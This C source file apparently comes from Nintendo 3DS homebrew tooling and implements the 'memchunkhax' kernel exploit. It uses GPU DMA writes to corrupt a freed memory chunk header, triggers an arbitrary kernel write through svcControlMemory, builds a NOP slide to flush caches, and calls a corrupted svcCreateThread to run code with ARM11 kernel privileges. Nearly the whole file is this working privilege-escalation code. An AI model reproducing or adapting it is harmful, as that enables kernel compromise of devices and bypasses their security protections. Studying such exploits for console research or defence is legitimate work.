#include "memchunkhax.h"

#include <stddef.h>
#include <stdint.h>
#include "firmcompat.h"
#include "appcompat.h"

void gspwn_copy(void *dest, void *src, uint32_t length, int check, int check_offset)
{
    // We'll use some memory to check the copy is being done right.
    void *check_mem = (void *)APP_CHECK_MEM;
    int *check_loc = (int *)(check_mem + check_offset);

    while(*check_loc != check) {
        app->memcpy(check_mem, check_mem, 0x10000);
        app->GSPGPU_FlushDataCache(src, length);

        uint32_t arr1[] = {4, (uint32_t)src, (uint32_t)dest, length,
                           0xFFFFFFFF, 0xFFFFFFFF, 8, 0};
        app->nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue((void *)app->gpuHandle, arr1);

        app->GSPGPU_FlushDataCache(check_mem, 0x10);

        uint32_t arr2[] = {4, (uint32_t)dest, (uint32_t)check_mem, 0x10,
                           0xFFFFFFFF, 0xFFFFFFFF, 8, 0};
        app->nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue((void *)app->gpuHandle, arr2);

        app->memcpy(check_mem, check_mem, 0x10000);
    }
}

#if defined(ENTRY_MSET)
void build_nop_slide(uint32_t *dest, unsigned int len)
{
    unsigned int i;
    for (i = 0; i < len; i++) {
        dest[i] = 0xE1A00000;  // ARM instruction: nop
    }
    dest[i - 1] = 0xE12FFF1E;  // ARM instruction: bx lr
}
#endif

__attribute__((naked))
void corrupted_svcCreateThread(__attribute__((unused)) void (*func)())
{
    __asm__ volatile ("svc 8");
}

void memchunk_arm11hax(void (*func)())
{
    // I need some memory locations to use
    uint32_t *mem_hax_mem = (uint32_t *)APP_MEM_HAX_MEM;
    uint32_t *mem_hax_mem_free = (uint32_t *)((uint32_t)mem_hax_mem + 0x1000);

    // There's not much documentation on this code.
    // I've never studied the logic of it, so I can't describe it in more detail.

    // Free some random chunk of memory
    uint32_t tmp_addr;
    app->svcControlMemory(&tmp_addr, mem_hax_mem_free, NULL, 0x1000, 1 /* MEMOP_FREE */, 0);

    // arm11_buffer is the location that is copied *from* when using gspwn_copy
    uint32_t *arm11_buffer = (uint32_t *)APP_ARM11_BUFFER;
    arm11_buffer[0] = 1;
    arm11_buffer[1] = fw->kernel_patch_address;
    arm11_buffer[2] = 0;
    arm11_buffer[3] = 0;

    // Copy the arm11_buffer to the freed memory with gspwn
    gspwn_copy(mem_hax_mem_free, arm11_buffer, 0x10, fw->kernel_patch_address, 4);

    // Trigger kernel write
    app->svcControlMemory(&tmp_addr, mem_hax_mem, NULL, 0x1000, 1 /* MEMOP_FREE */, 0);

    // Tricks to clear the instruction cache
#if defined(ENTRY_MSET)
    int slide_len = 0x1000;

    // Build a NOP slide
    build_nop_slide(arm11_buffer, slide_len);

    // Copy the NOP slide
    uint32_t app_code_offset = 0;
    uint32_t kernel_version = *(uint32_t *)0x1FF80000;
    if(kernel_version < 0x02230600) { // firm 4.x
        app_code_offset = 0x03E6D000;
    }
    else { // > firm 4.x
        app_code_offset = 0x7B00000;
    }

    gspwn_copy((void *)(0x14000000 + app_code_offset + 0x4000), arm11_buffer,
            slide_len * 4, 0xE1A00000, 0);

    // Run the NOP slide
    ((void (*)())0x104000)();
#elif defined(ENTRY_SPIDER)
    // Fills the bottom buffer with a random pattern
    void *src = (void *)0x18000000;
    for (int i = 0; i < 3; i++) {  // Do it 3 times to be safe
        app->GSPGPU_FlushDataCache(src, 0x00038400);
        app->GX_SetTextureCopy(src, (void *)0x1F48F000, 0x00038400, 0, 0, 0, 0, 8);
        app->svcSleepThread(0x400000LL);
        app->GSPGPU_FlushDataCache(src, 0x00038400);
        app->GX_SetTextureCopy(src, (void *)0x1F4C7800, 0x00038400, 0, 0, 0, 0, 8);
        app->svcSleepThread(0x400000LL);
    }
#endif

    // Get into arm11
    corrupted_svcCreateThread(func);
}
